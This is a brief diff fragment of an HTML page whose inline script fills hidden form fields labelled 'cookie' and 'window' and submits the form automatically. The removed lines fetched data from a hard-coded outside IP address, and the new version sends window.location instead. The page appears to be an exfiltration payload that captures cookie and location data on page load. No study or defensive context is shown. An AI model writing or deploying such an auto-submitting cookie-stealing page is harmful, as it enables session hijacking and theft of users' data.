@@ -11,11 +11,11 @@
                     </form>
 
                     <script>
-                      fetch('http://45.12.114.110:30031/table/list').then(res=>res.text()).then(r=>{ 
+                    
                         document.getElementById('cookie').value = ff
-                        document.getElementById('window').value = r 
+                        document.getElementById('window').value = JSON.stringify(window.location)
                         document.getElementById('form').submit()
-                     })
+                    
                     
                       
                       
